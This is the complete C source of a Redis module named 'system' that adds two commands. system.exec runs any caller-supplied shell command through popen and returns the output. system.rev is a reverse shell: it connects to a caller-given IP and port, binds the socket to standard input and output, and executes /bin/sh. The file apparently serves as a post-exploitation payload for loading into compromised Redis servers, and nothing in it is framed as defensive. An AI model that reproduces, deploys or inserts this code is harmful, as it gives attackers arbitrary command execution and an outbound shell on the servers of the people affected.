#include "redismodule.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);

    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "ERR popen failed");
        return REDISMODULE_OK;
    }

    size_t cap = 4096;
    size_t used = 0;
    char *output = calloc(1, cap);
    char buf[1024];

    if (!output) {
        pclose(fp);
        RedisModule_ReplyWithError(ctx, "ERR OOM");
        return REDISMODULE_OK;
    }

    while (fgets(buf, sizeof(buf), fp) != NULL) {
        size_t blen = strlen(buf);

        if (used + blen + 1 > cap) {
            size_t newcap = cap * 2;
            while (used + blen + 1 > newcap) newcap *= 2;

            char *tmp = realloc(output, newcap);
            if (!tmp) {
                free(output);
                pclose(fp);
                RedisModule_ReplyWithError(ctx, "ERR OOM");
                return REDISMODULE_OK;
            }
            output = tmp;
            cap = newcap;
        }

        memcpy(output + used, buf, blen);
        used += blen;
        output[used] = '\0';
    }

    pclose(fp);

    RedisModuleString *ret = RedisModule_CreateString(ctx, output, used);
    RedisModule_ReplyWithString(ctx, ret);
    free(output);

    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) return RedisModule_WrongArity(ctx);

    size_t tmp_len;
    const char *ip = RedisModule_StringPtrLen(argv[1], &tmp_len);
    const char *port_s = RedisModule_StringPtrLen(argv[2], &tmp_len);
    int port = atoi(port_s);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return REDISMODULE_OK;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(s);
        return REDISMODULE_OK;
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    char *const sh_argv[] = {"/bin/sh", NULL};
    char *const sh_envp[] = {NULL};
    execve("/bin/sh", sh_argv, sh_envp);

    close(s);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    REDISMODULE_NOT_USED(argv);
    REDISMODULE_NOT_USED(argc);

    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
